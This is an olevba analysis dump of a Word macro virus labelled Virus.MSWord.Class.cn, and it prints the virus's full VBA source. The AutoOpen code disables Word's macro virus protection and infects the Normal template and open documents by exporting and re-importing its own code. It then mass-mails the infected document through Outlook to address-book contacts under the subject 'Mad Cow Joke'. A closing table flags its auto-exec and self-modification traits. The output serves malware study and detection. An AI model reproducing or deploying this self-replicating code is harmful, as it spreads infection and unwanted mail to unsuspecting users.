olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.cn-c952e08f23c8ad13b29a24c0b62666334ee19951
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.cn-c952e08f23c8ad13b29a24c0b62666334ee19951 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
On Error Resume Next
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
Options.VirusProtection = 0 - 0
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
Options.SaveNormalPrompt = 0 - 0
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
Options.ConfirmConversions = 0 - 0
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
VSize = 136
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
If nt < VSize - 1 Then
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
    Set Vhost = NormalTemplate.VBProject.VBComponents.Item(1)
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
    Set VSource = ActiveDocument.VBProject.VBComponents.Item(1)
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
    nt = 77
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
    GoTo out
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
End If
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
If ad = 0 Then
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
    Set Vhost = ActiveDocument.VBProject.VBComponents.Item(1)
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
    Set VSource = NormalTemplate.VBProject.VBComponents.Item(1)
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
    GoTo out
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
End If
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
GoTo VMailer
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
out:
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
With Vhost.CodeModule
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
    VSource.Export "c:\v.sys"
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
    .AddFromFile ("c:\v.sys")
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
    For x = 2 To VSize Step 2
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
        .ReplaceLine x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
    Next x
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
End With
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
For x = 1 To 4
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
     Vhost.CodeModule.deletelines 1
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
Next x
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
Vhost.CodeModule.ReplaceLine 1, "Sub AutoOpen"
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
Vhost.CodeModule.ReplaceLine 131, "Sub ViewVBCode"
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
If nt = 77 Then
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 1, "Sub AutoClose"
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 131, "Sub ToolsMacro"
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
End If
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
VMailer:
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
If ActiveDocument.Name <> "Madcow" Then
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
    Dim VOutlook, VMapi, VMail
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
    Set VOutlook = CreateObject("Outlook.Application")
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
    Set VMapi = VOutlook.GetNameSpace("MAPI")
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
    If VOutlook = "Outlook" Then
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
    VMapi.Logon "profile", "password"
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
        For y = 1 To VMapi.AddressLists.Count
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
            Set AddyBook = VMapi.AddressLists(y)
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
            x = 1
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
            Set VMail = VOutlook.CreateItem(0)
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
            For oo = 1 To AddyBook.AddressEntries.Count
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
                Peep = AddyBook.AddressEntries(x)
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
                VMail.Recipients.Add Peep
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
                x = x + 1
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
                If x > 20 Then oo = AddyBook.AddressEntries.Count
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
             Next oo
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
             VMail.Subject = "Mad Cow Joke"
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
             VMail.Body = "Beware of the spread of the Madcow Disease"
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
             VMail.Attachments.Add ActiveDocument.FullName
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
             VMail.Send
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
             Peep = ""
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
        Next y
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
    VMapi.Logoff
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
    End If
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
End If
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
VError:
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
End Sub
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
Sub ViewVBCode()
'cjm2000-8-15 15:43:23w97m_class_cn_mm大眼夹
End Sub

'WORD/VERONICA // thanks to WORD/MELLISA & WORD/CLASS

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

